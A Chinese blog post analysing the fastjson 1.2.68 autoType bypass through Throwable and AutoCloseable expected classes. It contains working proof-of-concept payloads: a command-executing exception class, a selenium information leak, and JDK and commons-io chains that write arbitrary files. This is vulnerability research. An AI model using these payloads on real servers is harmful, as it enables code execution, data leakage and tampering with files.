---
title: "fastjson 1.2.68漏洞分析及commons-io写文件"
onlyTitle: true
date: 2024-10-28 11:42:23
categories:
- java
- 框架漏洞
tags:
- fastjson
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8114.png
---



fastjson 1.2.68版本绕过

# fastjson 1.2.68

在之前版本1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复。

TypeUtils.loadClass加了一个cache判断

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023192305499.png)

而MiscCodec.deserialze调用时，cache默认为false。直接阻断了cache提前加载恶意类的攻击链路

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023192343346.png)

1.2.48-1.2.67都是安全的（不手动关autoType的情况下）。随着版本的更新，直到`fastjson1.2.68`又存在一个新的漏洞点，可使用`expectClass`去绕过`checkAutoType()`检测机制，主要使用`Throwable`和 `AutoCloseable`来绕过

下面配置一下环境`pom.xml`

```
	<dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.68</version>
    </dependency>
```

在`1.2.68`版本下，更新了一个新的安全控制点 `safeMode`，如果开启的话，将在`checkAutoType()`直接抛出异常。从赋值可以看出，如果设置了`@type`就会抛出异常，开了safemode的直接打不了fastjson

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023193418636.png)

safemode默认不开启

checkAutoType中，用getClassFromMapping从mappings读取类，并在满足第二个红框的条件下，直接return了取出的类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023221338363.png)

条件如下：

* 期望类expectClass不为空
* typeName不是HashMap类
* 期望类是typeName的子类

在mappings初始化时，向其中put进了很多类，其实就是白名单了。其中就包括Exception和AutoCloseable，我们后面的攻击都基于这两个接口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024110548113.png)

有没有办法提前添加期望类呢？

注意expectClass来自checkAutoType的第二个参数：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024111812626.png)

查找用法发现JavaBeanDesrtializer.deserialze和ThrowableDeserializer.deserialze都调用了带期望类参数的checkAutoType

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024111928928.png)

前者是fastjson默认反序列化器，后者是针对异常类的反序列化器

这里写的比较简单了，不动的可以看详细黑白名单匹配过程

https://godownio.github.io/2025/05/27/fastjson-quan-ban-ben-fan-xu-lie-hua-pi-pei-hei-bai-ming-dan-guo-cheng/

先看ThrowableDeserializer

## ThrowableDeserializer

在fastjson中，先是DefaultJSONParser.parse调用ParserConfig.checkAutoType检查和获取类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024113450442.png)

然后再是获取反序列化器调用deserialze

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024113754047.png)

如果这里deserializer是ThrowableDeserializer，并且下一个key为`@type`的话，就会再次调用checkAutoType，但是这里是带Throwable.class作为expectClass

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024114756431.png)

如果我们这里传的第一个参数exClassName是恶意的实现了Throwable子类，就能命令执行。

由于缓存mappings的白名单是Exception，正好Exception是Throwable子类，那实现Exception就能绕过

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024115101467.png)

在ParserConfig.getDeserializer也能发现，Throwable子类也是返回ThrowableDeserializer作为反序列化器

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024122201499.png)

不过目前没有实现Exception的库类可以进一步利用，如果可以写文件，那搭配起来就很丝滑了，假如我们向服务器写入了恶意类CalcException如下：

```java
public class EvilException extends Exception{
    private String command;

    public void setCommand(String command) {
        this.command = command;
        try {
            Runtime.getRuntime().exec(command);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

JSON字符串：

```java
{"x":
	{"@type":"java.lang.Exception",
	 "@type":"me.mole.exception.CalcException", 
	         "command":"calc"}, 
}
```

测试POC：

```java
public static void main(String[] args) throws Exception
{
    String payload = "{\"x\":\n" +
            "\t{\"@type\":\"java.lang.Exception\",\n" +
            "\t \"@type\":\"org.exploit.third.fastjson.EvilException\", \n" +
            "\t         \"command\":\"calc\"}, \n" +
            " }";
    JSON.parse(payload);
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024121847287.png)

### ThrowableDeserializer+selenium

需要有selenium依赖

```xml
<dependency>
  <groupId>org.seleniumhq.selenium</groupId>
  <artifactId>selenium-api</artifactId>
  <version>4.1.1</version>
</dependency>
```

org.openqa.selenium.WebDriverException类的getMessage()方法和getSystemInformation()方法都能获取一些系统信息，比如：IP地址、主机名、系统架构、系统名称、系统版本、JDK版本、selenium webdriver版本。另外，还可通过getStackTrace()来获取函数调用栈，从而获悉使用了什么框架或组件。

但是调用方法是getter，且并不满足fastjson调用的getter规则，有其他办法调用到吗？之前分析了一篇fastjson>=1.2.36 $ref调用 getter，膜Y4tacker

https://godownio.github.io/2024/10/24/fastjson-ref-diao-yong-getter/

```java
{"x":
  {"@type":"java.lang.Exception",
  "@type":"org.openqa.selenium.WebDriverException"},
 "y":{"$ref":"$x.systemInformation"},
 "z":{"$ref":"$x.message"},
}
```

不过只是WebDriverException.getMessage并没有回显，需要目标服务器回显才能用

```java
public class selenium_ref_1_2_68 {
    public static void main(String[] args) throws Exception
    {
        String payload = "{\"x\":\n" +
                "  {\"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\":\"org.openqa.selenium.WebDriverException\"},\n" +
                " \"y\":{\"$ref\":\"$x.systemInformation\"},\n" +
                " \"z\":{\"$ref\":\"$x.message\"}\n" +
                "}";
        JSONObject json = (JSONObject) JSON.parse(payload);
        System.out.println(json.getString("y"));
        System.out.println(json.getString("z"));
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024174412073.png)



## JavaBeanDeserializer

ThrowableDeserializer#deserialze调用的checkAutoType中向期望类传参是固定的，为Throwable.class

JavaBeanDeserializer#deserialze的expectClass参数是用户可控的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024213759114.png)

其中type直接来自deserialze参数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024214131683.png)

这里期望类基本都会选择AutoCloseable，原因有以下几点：

* AutoCloseable不在黑名单内，且在mappings缓存表内

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025113509136.png)

* 用到AutoCloseable的很多，其中包括了输入ObjectInput和输出ObjectOutput接口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025113643858.png)

于是出现了输入流转输出流写文件，输出流转输入流读文件的骚操作

很明显，AutoCloseable子类是返回JavaBeanDeserializer的，所以流程和前面分析ThrowableDeserializer的一样

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025114206866.png)

问题转向了，怎么找到AutoCloseable的子类来进行输入流和输出流的互转？

我们知道fastjson对方法的调用还是要落实到setter、getter和构造方法上的

https://godownio.github.io/2024/10/25/fastjson-jackson-da-qu-fen/

浅蓝师傅给出了写文件的利用条件：

* 需要一个通过 set 方法或构造方法指定文件路径的 OutputStream（作为输出文件流）
* 需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream（作为一个OutputStream转为另一个OutputStream的桥梁）
* 需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法调用传入的 OutputStream 的 flush 方法（用于将缓冲区中的数据写入目标输入流）

在介绍commons-io写文件之前，介绍一个 JRE 8  的写文件的利用链：

POC：

```json
{
    "x":{
        "@type":"java.lang.AutoCloseable",
        "@type":"sun.rmi.server.MarshalOutputStream",
        "out":{
            "@type":"java.util.zip.InflaterOutputStream",
            "out":{
                "@type":"java.io.FileOutputStream",
                "file":"/tmp/dest.txt",
                "append":false
            },
            "infl":{
                "input":"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=="
            },
            "bufLen":1048576
        },
        "protocolVersion":1
    }
}
```

其中sun.rmi.server.MarshalOutputStream、java.util.zip.InflaterOutputStream 以及 java.io.FileOutputStream 的参数均是基于有参构造函数进行构建。且均是JDK原生字节码

fastjson在找不到默认无参构造函数的情况下，会遍历所有构造函数，使用lookupParametersName寻找带参数名信息的构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png)



缺失了LocalVeriableTable并不会影响类的正常使用和反射调用，但是会使调试出现问题，无法提供方法中局部变量的名称、类型和作用范围等信息。

ASMUtils.lookupParametersName 方法依赖于 LocalVariableTable 信息来查找方法参数的名称。

https://zhuanlan.zhihu.com/p/263503452

> **LocalVariableTable**该属性的作用是描述帧栈中局部变量与源码中定义的变量之间的关系。可以使用 -g:none 或  -g:vars来取消或生成这项信息，如果没有生成这项信息，那么当别人引用这个方法时，将无法获取到参数名称，取而代之的是arg0,  arg1这样的占位符。start  表示该局部变量在哪一行开始可见，length表示可见行数，Slot代表所在帧栈位置，Name是变量名称，然后是类型签名。



目前只发现 CentOS 下的 OpenJDK 8 字节码调试信息中含有 LocalVariableTable。或者是win下的OpenJDK >=11，所以利用环境非常有限



下面介绍一种比较通用的写文件手法

## Commons-io 2.x写文件

来自长亭科技的voidfyoo真是太强啦，以下类均满足没有无参构造函数（这样才能构造有参），且使用的都是参数最多那个构造函数

由于`commons-io`是广泛使用的第三方io库，所以很有实战价值。

既然JDK原生字节码不带LocalVariableTable，那看下第三方库，很多第三方库里的字节码是有 LocalVariableTable 的

pom.xml

```xml
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.5</version>
</dependency>
```

### 调用任意InputStream.read

org.apache.commons.io.input.XmlStreamReader参数最多的构造函数接收参数InputStream，用BufferedInputStream封装了该InputStream，接着调用了doHttpStream

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025201802638.png)

BufferedInputStream继承了FilterInputStream

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025201921757.png)

构造函数也调用了父类构造函数进行封装

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025202014673.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025202025085.png)

经过以下链，能最后触发到InputStream.read()

```java
XmlStreamReader.doHttpStream ->
BOMInputStream.getBomCharsetName ->
BOMInputStream.getBom ->
BufferedInputStream.read ->
BufferedInputStream.fill ->
InputStream.read(byte[], int, int)
```

在BufferedInputStream内，用getInIfOpen将流还原为了InputStream并调用read

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025202256698.png)

使用XmlStreamReader构造函数能调用任意InputStream的read方法



### 传入字符串作为InputStream

org.apache.commons.io.input.ReaderInputStream 的构造函数接受 Reader 对象作为参数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025210625252.png)

它的read方法（符合参数）调用了fillBuffer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025210829799.png)

fillBuffer调用了Reader.read

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025210907739.png)

如果这里我们传入的Reader是org.apache.commons.io.input.CharSequenceReader 

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025211416729.png)

CharSequenceReader.read循环调用了无参的read，并把结果放到array

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025211640196.png)

无参read每次返回charSequence（构造函数传入的参数）一个字符

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025211712759.png)

fillBuffer 方法在这里的主要功能是从 CharSequenceReader 中读取字符并填充到 encoderIn 缓冲区，然后通过 encoder 将字符编码为字节并存储在 encoderOut 缓冲区中。

你问InputStream在哪？ReaderInputStream不就是吗

输入字符串用ReaderInputStream存储如下，由于ReaderInputStream实际上是创了个Buffer来存储流，构造函数需要传Buffer创建需要的参数：

```json
{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.ReaderInputStream",
  "reader":{
    "@type":"org.apache.commons.io.input.CharSequenceReader",
    "charSequence":{"@type":"java.lang.String""aaaaaa......(YOUR_INPUT)"
  },
  "charsetName":"UTF-8",
  "bufferSize":1024
}
```



### InputStream转OutputStream

TeeInputStream接收InputStream和OutputStream作为参数，也没有无参构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025204526035.png)

有对应参数的read，read方法调用了OutputStream.write

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025204635306.png)

OutputStream 的 write 方法用于将数据写入输出流。

`void write(byte[] b, int off, int len)`将字节数组 b 中从偏移量 off 开始的 len 个字节写入输出流。

XmlStreamReader+TeelInputStream能调用write任意InputStream输出到OutputStream。满足了利用条件2

那怎么使输出流为文件流呢？

### OutputStream 输出到文件

org.apache.commons.io.output.WriterOutputStream 的构造函数接受 Writer 对象作为参数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027132252568.png)

write方法在有writeImmediately参数的情况下会调用flushOutput

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027132634850.png)

flushOutput调用了Writer.write

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027132940024.png)

假如这里的Writer是FileWriterWithEncoding

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027191950126.png)

FileWriterWithEncoding接收File为参数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027192058604.png)

构造函数内的initWriter初始化了一个OutputStreamWriter，封装了FileOutputStream

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027192245895.png)

FileWriterWithEncoding.write->OutputStreamWriter.write->StreamEncoder.write

org.apache.commons.io.output.WriterOutputStream 满足了利用条件3

org.apache.commons.io.output.FileWriterWithEncoding满足了利用条件1



现在让我们串一下利用链：

```java
存储char到InputStream
XmlStreamReader.doHttpStream ->
BOMInputStream.getBomCharsetName ->
BOMInputStream.getBom ->
BufferedInputStream.read ->
BufferedInputStream.fill ->

ReaderInputStream.read ->
ReaderInputStream.fillBuffer ->
CharSequenceReader.read读字符串

输出InputStream到OutputStream到文件
XmlStreamReader.doHttpStream ->
BOMInputStream.getBomCharsetName ->
BOMInputStream.getBom ->
BufferedInputStream.read ->
BufferedInputStream.fill ->

TeeInputStream.read ->
WriterOutputStream.write ->
WriterOutputStream.flushOutput ->
FileWriterWithEncoding.write ->
StreamEncoder.write ->
StreamEncoder.implWrite ->
StreamEncoder.writeBytes写文件
```



然而在StreamEncoder.write->implWrite中，如果不满缓冲区（Underflow）会break，缓冲区满才会writeBytes

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027195307686.png)

默认的缓冲区大小是8192

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027195913496.png)



但是传入的BufferedInputStream一块只有4096

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027200003411.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027200032893.png)



利用$ref可以多次调用StreamEncoder.implWrite向同一个缓冲区写入流数据，直到overflow写文件

### POC

commons-io在2.0-2.6和2.7-2.8版本之间各文件的构造函数参数名有些许不同

比如2.5版本下CharSequenceReader有且仅有一个构造函数如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027202206789.png)

而2.7版本下CharSequenceReader有三个构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027202325511.png)



2.0-2.6版本POC：

```json
{
    "x": {
        "@type": "com.alibaba.fastjson.JSONObject",
        "input": {
            "@type": "java.lang.AutoCloseable",
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "org.apache.commons.io.input.CharSequenceReader",
                "charSequence": {
                    "@type": "java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
                },
                "charsetName": "UTF-8",
                "bufferSize": 1024
            },
            "branch": {
                "@type": "java.lang.AutoCloseable",
                "@type": "org.apache.commons.io.output.WriterOutputStream",
                "writer": {
                    "@type": "org.apache.commons.io.output.FileWriterWithEncoding",
                    "file": "/tmp/pwned",
                    "encoding": "UTF-8",
                    "append": false
                },
                "charsetName": "UTF-8",
                "bufferSize": 1024,
                "writeImmediately": true
            },
            "trigger": {
                "@type": "java.lang.AutoCloseable",
                "@type": "org.apache.commons.io.input.XmlStreamReader",
                "is": {
                    "@type": "org.apache.commons.io.input.TeeInputStream",
                    "input": {
                        "$ref": "$.input"
                    },
                    "branch": {
                        "$ref": "$.branch"
                    },
                    "closeBranch": true
                },
                "httpContentType": "text/xml",
                "lenient": false,
                "defaultEncoding": "UTF-8"
            },
            "trigger2": {
                "@type": "java.lang.AutoCloseable",
                "@type": "org.apache.commons.io.input.XmlStreamReader",
                "is": {
                    "@type": "org.apache.commons.io.input.TeeInputStream",
                    "input": {
                        "$ref": "$.input"
                    },
                    "branch": {
                        "$ref": "$.branch"
                    },
                    "closeBranch": true
                },
                "httpContentType": "text/xml",
                "lenient": false,
                "defaultEncoding": "UTF-8"
            },
            "trigger3": {
                "@type": "java.lang.AutoCloseable",
                "@type": "org.apache.commons.io.input.XmlStreamReader",
                "is": {
                    "@type": "org.apache.commons.io.input.TeeInputStream",
                    "input": {
                        "$ref": "$.input"
                    },
                    "branch": {
                        "$ref": "$.branch"
                    },
                    "closeBranch": true
                },
                "httpContentType": "text/xml",
                "lenient": false,
                "defaultEncoding": "UTF-8"
            }
        }
    }
```



2.7-2.8版本POC：

```json
{
    "x": {
        "@type": "com.alibaba.fastjson.JSONObject",
        "input": {
            "@type": "java.lang.AutoCloseable",
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "org.apache.commons.io.input.CharSequenceReader",
                "charSequence": {
                    "@type": "java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
                    "start": 0,
                    "end": 2147483647
                },
                "charsetName": "UTF-8",
                "bufferSize": 1024
            },
            "branch": {
                "@type": "java.lang.AutoCloseable",
                "@type": "org.apache.commons.io.output.WriterOutputStream",
                "writer": {
                    "@type": "org.apache.commons.io.output.FileWriterWithEncoding",
                    "file": "/tmp/pwned",
                    "charsetName": "UTF-8",
                    "append": false
                },
                "charsetName": "UTF-8",
                "bufferSize": 1024,
                "writeImmediately": true
            },
            "trigger": {
                "@type": "java.lang.AutoCloseable",
                "@type": "org.apache.commons.io.input.XmlStreamReader",
                "inputStream": {
                    "@type": "org.apache.commons.io.input.TeeInputStream",
                    "input": {
                        "$ref": "$.input"
                    },
                    "branch": {
                        "$ref": "$.branch"
                    },
                    "closeBranch": true
                },
                "httpContentType": "text/xml",
                "lenient": false,
                "defaultEncoding": "UTF-8"
            },
            "trigger2": {
                "@type": "java.lang.AutoCloseable",
                "@type": "org.apache.commons.io.input.XmlStreamReader",
                "inputStream": {
                    "@type": "org.apache.commons.io.input.TeeInputStream",
                    "input": {
                        "$ref": "$.input"
                    },
                    "branch": {
                        "$ref": "$.branch"
                    },
                    "closeBranch": true
                },
                "httpContentType": "text/xml",
                "lenient": false,
                "defaultEncoding": "UTF-8"
            },
            "trigger3": {
                "@type": "java.lang.AutoCloseable",
                "@type": "org.apache.commons.io.input.XmlStreamReader",
                "inputStream": {
                    "@type": "org.apache.commons.io.input.TeeInputStream",
                    "input": {
                        "$ref": "$.input"
                    },
                    "branch": {
                        "$ref": "$.branch"
                    },
                    "closeBranch": true
                },
                "httpContentType": "text/xml",
                "lenient": false,
                "defaultEncoding": "UTF-8"
            }
        }
```



参考：

https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg
